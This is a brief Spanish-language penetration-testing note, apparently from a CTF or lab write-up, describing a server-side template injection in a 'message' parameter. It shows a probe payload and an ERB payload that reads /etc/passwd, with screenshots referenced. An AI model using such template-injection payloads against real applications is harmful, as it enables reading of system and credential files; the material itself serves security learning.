Revisando la aplicación me di cuenta que el parámetro message que recibía el usuario como alerta, era controlable por el mismo y era vulnerable a SSTI

Probé un payload de prueba

```
<=%7*7%>
```

![[SSTI1.png]]

Pude leer /etc/passwd usando un payload de SSTI 

```
<%=File.open('/etc/passwd').read%>
```

![[SSTI2.png]]